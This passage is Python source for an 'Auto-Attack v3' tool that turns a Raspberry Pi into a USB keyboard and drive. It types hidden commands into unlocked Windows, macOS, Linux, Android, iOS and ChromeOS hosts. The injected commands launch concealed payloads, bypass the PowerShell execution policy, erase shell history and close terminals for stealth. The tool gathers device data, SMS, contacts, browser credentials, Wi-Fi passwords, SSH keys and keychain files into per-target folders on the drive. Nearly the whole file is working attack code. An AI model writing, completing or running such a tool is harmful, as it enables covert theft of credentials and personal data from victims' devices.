            layout = "fr"
        elif "german" in content:
            layout = "de"
        logger.info("Detected macOS layout: %s", layout)

    # Cleanup
    subprocess.run(["umount", mount], check=False, capture_output=True)
    subprocess.run(
        ["mount", "-o", "loop", image, mount],
        check=False, capture_output=True,
    )
    try:
        probe_path = Path(mount) / ".ldetect"
        probe_path.unlink(missing_ok=True)
    except OSError:
        pass
    subprocess.run(["sync"], check=False)
    return layout


# ────────────────────────────────────────────────────────────────────
#  Config & Result
# ────────────────────────────────────────────────────────────────────

@dataclass
class AttackConfig:
    mount_point: str = "/mnt/usb_share"
    hid_device: str = "/dev/hidg0"
    led_pin: int = 17
    wait_enumerate: float = 3.0            # reduced from 6
    os_detect_timeout: float = 10.0        # reduced from 15
    payload_timeout: float = 90.0          # deep extraction can take >45s
    auto_encrypt: bool = True
    auto_cleanup: bool = True
    keyboard_layout: str = "auto"          # "auto" | "us" | "fr" | "de"
    check_screen_lock: bool = True
    stealth: bool = True                   # minimise visible window footprint
    image_path: str = "/piusb.bin"         # raw FAT32 image path
    force_os: str = ""                     # skip detection, force target OS


@dataclass
class AttackResult:
    host_os: str = "unknown"
    keyboard_layout: str = "us"
    screen_was_locked: bool = False
    hid_injected: bool = False
    payload_executed: bool = False
    payload_completed: bool = False
    encrypted: bool = False
    files_collected: int = 0
    profile_dir: str = ""                  # target profile directory name
    target_id: str = ""                    # unique target identifier
    errors: List[str] = field(default_factory=list)
    start_time: str = ""
    end_time: str = ""
    duration_secs: float = 0.0


# ────────────────────────────────────────────────────────────────────
#  Attack Orchestrator v3 — Multi-Target
# ────────────────────────────────────────────────────────────────────

class AutoAttackV2:
    """
    Multi-target plug-and-play attack orchestrator.

    Key features:
    - Multi-target profiles: each host → targets/HOSTNAME_TIMESTAMP/
    - Speed-optimised HID (0.008s/char, ~30 chars/sec)
    - Stealth: closes terminal after payload runs
    - Windows / macOS / Linux / Android support
    - Per-target encryption with AES-256-GCM
    """

    def __init__(self, config: Optional[AttackConfig] = None):
        self.cfg = config or AttackConfig()
        self.led = StatusLED(self.cfg.led_pin)
        self.result = AttackResult()
        self.kb: Optional[HIDKeyboard] = None
        self.profile_name: str = ""  # set at runtime

    def _resolve_layout(self) -> str:
        """Resolve keyboard layout from config or hint file.
        Returns 'auto' if live probing is needed."""
        if self.cfg.keyboard_layout != "auto":
            return self.cfg.keyboard_layout
        return detect_keyboard_layout(self.cfg.mount_point)

    def _probe_layout_live(self) -> str:
        """Run a live layout probe after OS detection.
        Uses Alt+Numpad on Windows (layout-independent).
        Returns detected layout string."""
        assert self.kb is not None
        layout = probe_keyboard_layout_live(
            self.kb,
            self.result.host_os,
            self.cfg.mount_point,
            self.cfg.image_path,
        )
        # Hot-swap the keyboard to the detected layout
        self.kb.switch_layout(layout)
        self.result.keyboard_layout = layout
        logger.info("Live probe detected layout: %s", layout)
        return layout

    def _init_keyboard(self, layout: str) -> None:
        self.kb = HIDKeyboard(self.cfg.hid_device, layout=layout)
        self.result.keyboard_layout = layout
        logger.info("HID keyboard initialised — layout=%s", layout)

    def _generate_profile_name(self) -> str:
        """Generate a unique profile directory name for this target."""
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        # Use a short hash of timestamp + random for uniqueness
        uid = hashlib.md5(f"{ts}{os.getpid()}".encode()).hexdigest()[:6]
        name = f"{self.result.host_os}_{ts}_{uid}"
        return name

    def _ensure_profile_dir(self) -> str:
        """Create targets/PROFILE_NAME/ on the USB image.
        Returns the profile directory name (relative to USB root)."""
        self.profile_name = self._generate_profile_name()
        targets_dir = Path(self.cfg.mount_point) / "targets" / self.profile_name
        targets_dir.mkdir(parents=True, exist_ok=True)
        self.result.profile_dir = f"targets/{self.profile_name}"
        self.result.target_id = self.profile_name
        logger.info("Profile directory: %s", self.result.profile_dir)
        return self.profile_name

    # ── Windows injection ────────────────────────────────────────────

    def _inject_windows(self) -> None:
        """
        Open PowerShell hidden and run windows_payload.ps1.
        Profile-aware: output goes to targets/PROFILE/ on USB.
        """
        assert self.kb is not None
        prof = self.profile_name

        self.kb.gui_r()
        time.sleep(0.5)

        # Short command: find TRUSTED drive, run payload with profile output path
        # Total ~220 chars, types in ~8s
        cmd = (
            'powershell -W Hidden -Ep Bypass -NoP -C "'
            "$d=(Get-Volume|?{$_.FileSystemLabel -match 'TRUSTED'}).DriveLetter;"
            f"if($d){{.\"${{d}}:\\windows_payload.ps1\"-OutputPath \"${{d}}:\\targets\\{prof}\"}}"
            '"'
        )
        logger.info("Windows injection: typing command (%d chars)", len(cmd))
        self.kb.type_line(cmd)

        # Stealth: Win+R window closes automatically after command
        logger.info("Windows injection: command sent")

    # ── macOS injection ──────────────────────────────────────────────

    def _inject_macos(self) -> None:
        """
        Open Terminal via Spotlight and execute macos_payload.sh.
        Profile-aware: output goes to targets/PROFILE/ on USB.
        """
        assert self.kb is not None
        prof = self.profile_name

        self.kb.gui(0x2C)   # Cmd+Space → Spotlight
        time.sleep(0.5)
        self.kb.type_string("Terminal")
        time.sleep(0.2)
        self.kb.enter()
        time.sleep(1.0)

        # Find TRUSTED volume, run payload in background with profile output
        cmd = (
            'v=$(ls -d /Volumes/TRUSTED* 2>/dev/null|head -1);'
            f'[ -n "$v" ]&&mkdir -p "$v/targets/{prof}"&&'
            f'nohup bash "$v/macos_payload.sh" -o "$v/targets/{prof}" '
            '>/dev/null 2>&1 &'
        )
        logger.info("macOS injection: typing command (%d chars)", len(cmd))
        self.kb.type_line(cmd)

        # Stealth: close Terminal after launching background payload
        if self.cfg.stealth:
            time.sleep(0.5)
            self.kb.type_line("exit")
            time.sleep(0.3)
            self.kb.cmd_w()  # Cmd+W to close terminal window

        logger.info("macOS injection: command sent")

    # ── Linux injection ──────────────────────────────────────────────

    def _inject_linux(self) -> None:
        """
        Inject on Linux via Ctrl+Alt+T.
        Mounts TRUSTED USB, runs linux_payload.sh with profile output dir.
        Then closes terminal for stealth.
        """
        assert self.kb is not None
        prof = self.profile_name

        logger.info("Linux injection: sending Ctrl+Alt+T")
        self.kb.ctrl_alt_t()
        time.sleep(1.5)

        # Mount USB, create profile dir, run payload with profile arg
        # ~280 chars, types in ~10s at 0.008s/char
        cmd = (
            "b=$(lsblk -rno PATH,LABEL 2>/dev/null|awk '/TRUSTED/{print $1}');"
            '[ -n "$b" ]&&udisksctl mount -b $b 2>/dev/null;sleep 1;'
            "f=$(find /media /run/media /mnt -name linux_payload.sh -maxdepth 4 2>/dev/null|head -1);"
            f'[ -n "$f" ]&&bash "$f" "{prof}"&disown;'
        )

        # Stealth: clear history and close terminal
        if self.cfg.stealth:
            cmd += "history -d $(history 1|awk '{print $1}') 2>/dev/null;exit"
        else:
            cmd += "exit"

        logger.info("Linux injection: typing command (%d chars)", len(cmd))
        self.kb.type_line(cmd)

        # Extra stealth: close terminal window after a brief pause
        if self.cfg.stealth:
            time.sleep(0.5)
            self.kb.alt_f4()

        logger.info("Linux injection: command sent successfully")

    # ── Android injection ────────────────────────────────────────────

    def _inject_android(self) -> None:
        """
        Android HID injection — multi-strategy approach.

        Strategy 1: Open Termux (if installed) and run android_payload.sh
                    from the USB drive. Extracts device info, WiFi, contacts,
                    call log, SMS, installed apps.
        Strategy 2: Open Chrome and navigate to a data: URL that displays
                    device fingerprint info (screen, UA, platform, memory).
        Strategy 3: Open Settings for visual OSINT (WiFi, About Phone).

        Limitations without ADB:
        - Cannot run shell commands on stock Android without terminal app
        - USB mass storage requires user tap to mount on Android 6+
        - Data extraction needs Termux or web-based exfiltration
        """
        assert self.kb is not None
        prof = self.profile_name

        logger.info("Android injection: starting multi-strategy HID attack")

        # ── Wake screen & go Home ──
        self.kb.press(0, 0x2C)   # Space to wake
        time.sleep(0.8)
        self.kb.home_key()
        time.sleep(0.5)

        # ── Strategy 1: Termux terminal for deep extraction ──
        logger.info("Android: trying Termux terminal...")
        self.kb.meta_key()       # App search on most launchers
        time.sleep(1.0)
        self.kb.type_string("termux")
        time.sleep(0.8)
        self.kb.enter()
        time.sleep(3.0)          # Wait for Termux to launch

        # If Termux opened, run android payload from USB or inline
        # The USB might be at /storage/XXXX-XXXX/ on Android
        termux_cmd = (
            'f=$(find /storage -name android_payload.sh -maxdepth 4 2>/dev/null|head -1);'
            'if [ -n "$f" ];then '
            f'bash "$f" "{prof}";'
            'else '
            'o=/sdcard/android_loot.txt;'
            '{'
            'echo "=== ANDROID ===";'
            'echo "Date: $(date)";'
            'echo "Device: $(getprop ro.product.model 2>/dev/null)";'
            'echo "Android: $(getprop ro.build.version.release 2>/dev/null)";'
            'echo "Brand: $(getprop ro.product.brand 2>/dev/null)";'
            'echo "Serial: $(getprop ro.serialno 2>/dev/null)";'
            'ip addr 2>/dev/null;'
            'pm list packages 2>/dev/null|head -40;'
            '} > $o;'
            'usb=$(ls -d /storage/????-????/ 2>/dev/null|head -1);'
            f'[ -n "$usb" ]&&mkdir -p "$usb/targets/{prof}"&&'
            f'cp $o "$usb/targets/{prof}/collection_summary.txt"&&'
            f'echo done>"$usb/targets/{prof}/.canary_unlock"&&'
            'echo done>"$usb/.canary_unlock";'
            'fi'
        )
        logger.info("Android Termux: typing command (%d chars)", len(termux_cmd))
        self.kb.type_line(termux_cmd)

        time.sleep(2.0)

        # ── Strategy 2: Chrome device fingerprint ──
        logger.info("Android: opening Chrome for device fingerprinting...")
        self.kb.home_key()
        time.sleep(0.5)
        self.kb.meta_key()
        time.sleep(1.0)
        self.kb.type_string("chrome")
        time.sleep(0.8)
        self.kb.enter()
        time.sleep(2.5)

        # Focus URL bar and navigate to device info data: URL
        self.kb.ctrl_l()
        time.sleep(0.3)
        info_url = (
            "data:text/html,<pre><script>"
            "document.write(JSON.stringify({"
            "ua:navigator.userAgent,"
            "p:navigator.platform,"
            "l:navigator.language,"
            "s:screen.width+'x'+screen.height,"
            "m:navigator.deviceMemory||'?',"
            "c:navigator.hardwareConcurrency||'?'"
            "},0,2))"
            "</script></pre>"
        )
        logger.info("Android Chrome: typing data: URL (%d chars)", len(info_url))
        self.kb.type_string(info_url)
        self.kb.enter()

        # ── Strategy 3: Open Settings for WiFi info ──
        time.sleep(2.0)
        self.kb.home_key()
        time.sleep(0.5)
        self.kb.meta_key()
        time.sleep(1.0)
        self.kb.type_string("settings")
        time.sleep(0.5)
        self.kb.enter()
        time.sleep(2.0)

        # Navigate down to WiFi (first or second item in Settings)
        self.kb.arrow_down(2)
        time.sleep(0.3)
        self.kb.enter()    # Open WiFi/Network
        time.sleep(1.0)

        # Stealth: go home after
        if self.cfg.stealth:
            time.sleep(2.0)
            self.kb.home_key()

        logger.info("Android injection: completed (Termux + Chrome + Settings)")

    # ── iOS injection ──────────────────────────────────────────────────

    def _inject_ios(self) -> None:
        """
        iOS/iPadOS HID injection — limited capability.

        iOS does not allow running shell commands via USB HID keyboard.
        Best effort: open Safari via Spotlight and navigate to a
        device fingerprint page (data: URL with JS).

        Works better on iPad (full keyboard shortcut support) than
        iPhone (limited external keyboard integration).

        Limitations:
        - No terminal / shell access without jailbreak
        - No file system access
        - No app automation
        - Safari blocks javascript: URLs but data: URLs work
        """
        assert self.kb is not None

        logger.info("iOS injection: limited mode — opening Safari")

        # Wake screen + Home
        self.kb.press(0, 0x2C)   # Space to wake
        time.sleep(0.8)
        self.kb.home_key()
        time.sleep(0.5)

        # Open Spotlight search (Cmd+Space on iPad)
        self.kb.gui(0x2C)        # Cmd+Space
        time.sleep(1.0)

        # Search for Safari
        self.kb.type_string("Safari")
        time.sleep(0.5)
        self.kb.enter()
        time.sleep(2.5)

        # Focus URL bar: Cmd+L
        self.kb.gui(0x0F)        # Cmd+L
        time.sleep(0.3)

        # Navigate to device fingerprint page
        info_url = (
            "data:text/html,<pre><script>"
            "document.write(JSON.stringify({"
            "ua:navigator.userAgent,"
            "p:navigator.platform,"
            "l:navigator.language,"
            "s:screen.width+'x'+screen.height"
            "},0,2))"
            "</script></pre>"
        )
        logger.info("iOS Safari: typing data: URL (%d chars)", len(info_url))
        self.kb.type_string(info_url)
        self.kb.enter()

        self.result.errors.append(
            "iOS detected — HID-only mode. "
            "Data extraction requires jailbreak or MDM access."
        )

        # Stealth: go home
        if self.cfg.stealth:
            time.sleep(3.0)
            self.kb.home_key()

        logger.info("iOS injection: completed (Safari fingerprint)")

    # ── ChromeOS injection ─────────────────────────────────────────────

    def _inject_chromeos(self) -> None:
        """
        ChromeOS / Chromebook HID injection.

        ChromeOS has crosh (Ctrl+Alt+T) which is a limited shell,
        and a Linux terminal (Crostini) if enabled.

        Strategy:
        1. Open crosh via Ctrl+Alt+T
        2. Try shell command (requires developer mode)
        3. Fallback: open Chrome and gather browser info
        """
        assert self.kb is not None
        prof = self.profile_name

        logger.info("ChromeOS injection: opening crosh + Chrome")

        # ── Strategy 1: crosh terminal ──
        self.kb.ctrl_alt_t()
        time.sleep(2.0)

        # In crosh, try to enter shell mode (needs developer mode)
        self.kb.type_line("shell")
        time.sleep(1.0)

        # If shell worked, run data collection
        cmd = (
            '{'
            'echo "=== CHROMEOS ===";'
            'echo "Date: $(date)";'
            'echo "User: $(whoami)";'
            'echo "Hostname: $(hostname)";'
            'uname -a;'
            'ip addr 2>/dev/null;'
            '} > /tmp/chromeos_loot.txt 2>&1;'
            'echo "=== DONE ==="'
        )
        self.kb.type_line(cmd)
        time.sleep(2.0)

        # ── Strategy 2: Chrome browser info ──
        # Open new Chrome tab
        self.kb.press(_CTRL, 0x17)  # Ctrl+T
        time.sleep(1.0)
        self.kb.ctrl_l()
        time.sleep(0.3)

        info_url = (
            "data:text/html,<pre><script>"
            "document.write(JSON.stringify({"
            "ua:navigator.userAgent,"
            "p:navigator.platform,"
            "l:navigator.language,"
            "s:screen.width+'x'+screen.height,"
            "m:navigator.deviceMemory||'?',"
            "c:navigator.hardwareConcurrency||'?'"
            "},0,2))"
            "</script></pre>"
        )
        self.kb.type_string(info_url)
        self.kb.enter()

        if self.cfg.stealth:
            time.sleep(3.0)
            self.kb.alt_f4()

        logger.info("ChromeOS injection: completed (crosh + Chrome)")

    # ── Encrypt results ──────────────────────────────────────────────

    def _encrypt(self) -> None:
        """Encrypt all collected files in the profile directory."""
        profile_path = os.path.join(self.cfg.mount_point, "targets", self.profile_name)
        if not os.path.isdir(profile_path):
            profile_path = self.cfg.mount_point  # fallback

        handler = SecureDataHandler(storage_path=profile_path)
        collected: Dict[str, str] = {}
        for pattern in ("*.txt", "*.json", "*.db", "*.sqlite", "*.xml", "*.plist"):
            for fp in glob.glob(os.path.join(profile_path, "**", pattern), recursive=True):
                try:
                    with open(fp, errors="replace") as f:
                        collected[os.path.relpath(fp, profile_path)] = f.read()[:100_000]
                except Exception:
                    pass
        if collected:
            handler.store_encrypted_data(collected, "collected_data.enc")
            self.result.encrypted = True
            self.result.files_collected = len(collected)
            logger.info("Encrypted %d file(s) → %s/collected_data.enc",
                        len(collected), self.result.profile_dir)
        else:
            logger.info("Nothing to encrypt")

    def _write_attack_metadata(self) -> None:
        """Write per-target metadata JSON in the profile directory."""
        profile_path = Path(self.cfg.mount_point) / "targets" / self.profile_name
        profile_path.mkdir(parents=True, exist_ok=True)

        meta = {
            "target_id": self.result.target_id,
            "host_os": self.result.host_os,
            "keyboard_layout": self.result.keyboard_layout,
            "attack_start": self.result.start_time,
            "attack_end": self.result.end_time,
            "duration_secs": round(self.result.duration_secs, 1),
            "hid_injected": self.result.hid_injected,
            "payload_completed": self.result.payload_completed,
            "files_collected": self.result.files_collected,
            "encrypted": self.result.encrypted,
            "errors": self.result.errors,
        }
        meta_file = profile_path / "attack_meta.json"
        meta_file.write_text(json.dumps(meta, indent=2))
        logger.info("Wrote attack metadata → %s", meta_file)

    # ── Main sequence ────────────────────────────────────────────────

    def run(self) -> AttackResult:
        t0 = time.monotonic()
        self.result.start_time = datetime.now(tz=timezone.utc).isoformat()

        # 1. LED: starting
        self.led.pattern("...", 0.1)   # 3 short blinks

        # 2. Wait for USB enumeration (fast)
        logger.info("Waiting %.1fs for host enumeration…", self.cfg.wait_enumerate)
        time.sleep(self.cfg.wait_enumerate)

        # 3. Detect OS (polling, multi-signal) or use forced OS
        if self.cfg.force_os:
            self.result.host_os = self.cfg.force_os
            logger.info("OS forced via config: %s", self.result.host_os)
        else:
            self.result.host_os = detect_host_os(
                self.cfg.mount_point,
                timeout=self.cfg.os_detect_timeout,
                image_path=self.cfg.image_path,
            )
            logger.info("Detected host OS: %s", self.result.host_os)

        # 4. Resolve keyboard layout (hint file → auto probe → fallback)
        layout = self._resolve_layout()
        # Start with 'us' for now — will probe live if needed
        self._init_keyboard(layout if layout != "auto" else "us")

        # 4b. If layout is 'auto', run live layout probe
        #     Uses Alt+Numpad codes (layout-independent) to query the target
        needs_live_probe = (layout == "auto")

        # 5. Create profile directory for this target
        self._ensure_profile_dir()

        # 5b. Sync and unmount USB image
        #     Prevents FAT32 corruption from concurrent Pi + host writes
        subprocess.run(["sync"], check=False)
        subprocess.run(["umount", self.cfg.mount_point],
                       check=False, capture_output=True)
        logger.info("USB unmounted — host has exclusive FAT32 access")

        # 6. LED solid = attacking
        self.led.on()
        logger.info("Starting attack — profile: %s", self.result.profile_dir)

        # 7. Screen lock check FIRST (skip for mobile / chromeos)
        #    Must happen before layout probe — no point probing a locked screen
        if (self.cfg.check_screen_lock and self.kb and self.kb.available
                and self.result.host_os not in ("android", "ios", "chromeos")):
            lock_detector = ScreenLockDetector(self.kb, self.cfg.mount_point)
            if not lock_detector.is_unlocked(self.result.host_os, timeout=8.0):
                self.result.screen_was_locked = True
                self.result.errors.append("Screen appears locked — aborting HID injection")
                logger.error("Screen locked — cannot proceed")
                self.led.pattern("---", 0.3)
                self.result.end_time = datetime.now(tz=timezone.utc).isoformat()
                self.result.duration_secs = time.monotonic() - t0
                self._write_attack_metadata()
                return self.result

        # 7b. Live layout probe (only if screen is unlocked)
        if needs_live_probe and self.kb and self.kb.available:
            logger.info("Running live keyboard layout probe…")
            try:
                detected = self._probe_layout_live()
                logger.info("Layout probe result: %s", detected)
            except Exception as exc:
                logger.warning("Layout probe failed: %s — using 'us'", exc)
                self.kb.switch_layout("us")
                self.result.keyboard_layout = "us"

        # 8. HID injection
        if self.kb and self.kb.available:
            try:
                if self.result.host_os == "windows":
                    self._inject_windows()
                elif self.result.host_os == "macos":
                    self._inject_macos()
                elif self.result.host_os == "android":
                    self._inject_android()
                elif self.result.host_os == "ios":
                    self._inject_ios()
                elif self.result.host_os == "chromeos":
                    self._inject_chromeos()
                else:
                    self._inject_linux()
                self.result.hid_injected = True
                self.result.payload_executed = True
                logger.info("HID injection completed for OS: %s", self.result.host_os)
            except Exception as exc:
                self.result.errors.append(f"HID injection failed: {exc}")
                logger.error("HID injection error: %s", exc)
        else:
            msg = f"HID device {self.cfg.hid_device} not found"
            self.result.errors.append(msg)
            logger.warning(msg)

        # 9. Adaptive wait for payload completion
        #    USB is unmounted — periodically remount RO to check marker
        profile_rel = f"targets/{self.profile_name}"
        logger.info("Waiting up to %.0fs for payload marker...", self.cfg.payload_timeout)

        deadline = time.monotonic() + self.cfg.payload_timeout
        marker_found = False

        # Let payload run at least 20s before first check
        time.sleep(min(20.0, self.cfg.payload_timeout * 0.5))

        while time.monotonic() < deadline:
            # Briefly mount read-only to peek at FAT32
            ret = subprocess.run(
                ["mount", "-o", "loop,ro", self.cfg.image_path,
                 self.cfg.mount_point],
                check=False, capture_output=True,
            )
            if ret.returncode == 0:
                time.sleep(0.3)
                mp = Path(self.cfg.mount_point)
                for marker_path in (
                    mp / profile_rel / "collection_summary.txt",
                    mp / profile_rel / ".canary_unlock",
                    mp / "collection_summary.txt",
                    mp / ".canary_unlock",
                ):
                    if marker_path.exists():
                        marker_found = True
                        break
                subprocess.run(
                    ["umount", self.cfg.mount_point],
                    check=False, capture_output=True,
                )
            if marker_found:
                break
            time.sleep(10.0)

        # Final remount read-write for consolidation / encryption
        subprocess.run(
            ["mount", "-o", "loop", self.cfg.image_path,
             self.cfg.mount_point],
            check=False, capture_output=True,
        )
        self.result.payload_completed = marker_found
        logger.info("Adaptive wait done — marker found: %s", marker_found)

        # 10. Move any root-level results into profile dir if payload wrote to root
        self._consolidate_results()

        # 11. Encrypt
        if self.cfg.auto_encrypt:
            try:
                self._encrypt()
            except Exception as exc:
                self.result.errors.append(f"Encryption failed: {exc}")

        # 12. Cleanup
        if self.cfg.auto_cleanup:
            for tmp in Path(self.cfg.mount_point).rglob("*.tmp"):
                tmp.unlink(missing_ok=True)
            (Path(self.cfg.mount_point) / ".canary_unlock").unlink(missing_ok=True)

        # 13. LED: done
        self.led.off()
        self.led.pattern(".-.-.", 0.1)  # success pattern

        self.result.end_time = datetime.now(tz=timezone.utc).isoformat()
        self.result.duration_secs = time.monotonic() - t0

        # 14. Write per-target metadata
        self._write_attack_metadata()

        # 15. Sync all writes to the backing image
        subprocess.run(["sync"], check=False)

        return self.result

    def _consolidate_results(self) -> None:
        """Move any loot from USB root into the profile directory.
        Handles payloads that write to USB root instead of profile dir."""
        root = Path(self.cfg.mount_point)
        profile = root / "targets" / self.profile_name
        profile.mkdir(parents=True, exist_ok=True)

        # Move common result files/dirs from root to profile
        move_items = [
            "collection_summary.txt", "collection_results.json",
            "DECRYPTED_CREDENTIALS.json", "WIFI_PASSWORDS.json",
            "loot", "chrome", "edge", "firefox", "safari",
            "wifi", "credman", "system", "ssh", "keychain",
            "payload.log",
        ]
        for item_name in move_items:
            src = root / item_name
            dst = profile / item_name
            if src.exists() and not dst.exists():
                try:
                    src.rename(dst)
                    logger.info("Moved %s → %s", item_name, self.result.profile_dir)
                except OSError:
                    pass


# ────────────────────────────────────────────────────────────────────
#  Target History Viewer
# ────────────────────────────────────────────────────────────────────

def list_targets(mount_point: str) -> List[Dict]:
    """List all previous attack targets from targets/ directory."""
    targets_dir = Path(mount_point) / "targets"
    if not targets_dir.exists():
        return []

    targets = []
    for d in sorted(targets_dir.iterdir()):
        if not d.is_dir():
            continue
        meta_file = d / "attack_meta.json"
        if meta_file.exists():
            try:
                meta = json.loads(meta_file.read_text())
                meta["profile_dir"] = d.name
                targets.append(meta)
            except Exception:
                targets.append({"profile_dir": d.name, "error": "corrupt metadata"})
        else:
            targets.append({"profile_dir": d.name, "status": "no metadata"})

    return targets


# ────────────────────────────────────────────────────────────────────
#  CLI
# ────────────────────────────────────────────────────────────────────

def main() -> int:
    import argparse

    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s [%(levelname)s] %(message)s",
    )

    parser = argparse.ArgumentParser(
        description="Auto-Attack v3 — Multi-Target Edition"
    )
    parser.add_argument("--mount", default="/mnt/usb_share")
    parser.add_argument("--hid", default="/dev/hidg0")
    parser.add_argument("--layout", default="auto", choices=["auto", "us", "fr", "de"])
    parser.add_argument("--wait-enum", type=float, default=3)
    parser.add_argument("--os-timeout", type=float, default=10)
    parser.add_argument("--payload-timeout", type=float, default=90)
    parser.add_argument("--image", default="/piusb.bin", help="Raw FAT32 image path")
    parser.add_argument("--force-os", default=None,
                        choices=["windows", "macos", "linux", "android", "ios", "chromeos"],
                        help="Skip OS detection, force target OS")
    parser.add_argument("--no-encrypt", action="store_true")
    parser.add_argument("--no-stealth", action="store_true")
    parser.add_argument("--no-lock-check", action="store_true")
    parser.add_argument("--dry-run", action="store_true")
    parser.add_argument("--list-targets", action="store_true",
                        help="List all previous attack targets")
    args = parser.parse_args()

    # List targets mode
    if args.list_targets:
        targets = list_targets(args.mount)
        if not targets:
            print("No targets found.")
            return 0
        print(f"\n{'='*60}")
        print(f" ATTACK HISTORY — {len(targets)} target(s)")
        print(f"{'='*60}")
        for i, t in enumerate(targets, 1):
            os_type = t.get("host_os", "?")
            start = t.get("attack_start", "?")
            dur = t.get("duration_secs", "?")
            files = t.get("files_collected", 0)
            status = "OK" if t.get("payload_completed") else "INCOMPLETE"
            print(f"\n  [{i}] {t['profile_dir']}")
            print(f"      OS: {os_type}  |  Started: {start}")
            print(f"      Duration: {dur}s  |  Files: {files}  |  Status: {status}")
            if t.get("errors"):
                for e in t["errors"]:
                    print(f"      ERROR: {e}")
        print(f"\n{'='*60}\n")
        return 0

    cfg = AttackConfig(
        mount_point=args.mount,
        hid_device=args.hid,
        wait_enumerate=args.wait_enum,
        os_detect_timeout=args.os_timeout,
        payload_timeout=args.payload_timeout,
        auto_encrypt=not args.no_encrypt,
        keyboard_layout=args.layout,
        stealth=not args.no_stealth,
        check_screen_lock=not args.no_lock_check,
        image_path=args.image,
        force_os=args.force_os or "",
    )

    if args.dry_run:
        kb = HIDKeyboard(cfg.hid_device, layout=cfg.keyboard_layout)
        print("=== DRY RUN (v3) ===")
        print(f"  Mount point    : {cfg.mount_point}")
        print(f"  HID device     : {cfg.hid_device}")
        print(f"  Keyboard layout: {cfg.keyboard_layout}")
        print(f"  Wait enum      : {cfg.wait_enumerate}s")
        print(f"  OS timeout     : {cfg.os_detect_timeout}s")
        print(f"  Payload timeout: {cfg.payload_timeout}s")
        print(f"  Image path     : {cfg.image_path}")
        print(f"  Encrypt        : {cfg.auto_encrypt}")
        print(f"  Stealth        : {cfg.stealth}")
        print(f"  Lock check     : {cfg.check_screen_lock}")
        print(f"  HID present    : {kb.available}")
        print(f"  Detected OS    : {detect_host_os(cfg.mount_point, timeout=5)}")

        # Show target history
        targets = list_targets(cfg.mount_point)
        print(f"  Past targets   : {len(targets)}")
        return 0

    attack = AutoAttackV2(cfg)
    result = attack.run()

    print("\n=== ATTACK RESULT (v3) ===")
    print(json.dumps({
        "host_os": result.host_os,
        "target_id": result.target_id,
        "profile_dir": result.profile_dir,
        "keyboard_layout": result.keyboard_layout,
        "screen_was_locked": result.screen_was_locked,
        "hid_injected": result.hid_injected,
        "payload_executed": result.payload_executed,
        "payload_completed": result.payload_completed,
        "encrypted": result.encrypted,
        "files_collected": result.files_collected,
        "errors": result.errors,
        "start": result.start_time,
        "end": result.end_time,
        "duration_secs": round(result.duration_secs, 1),
    }, indent=2))

    return 0 if not result.errors else 1


if __name__ == "__main__":
    sys.exit(main())
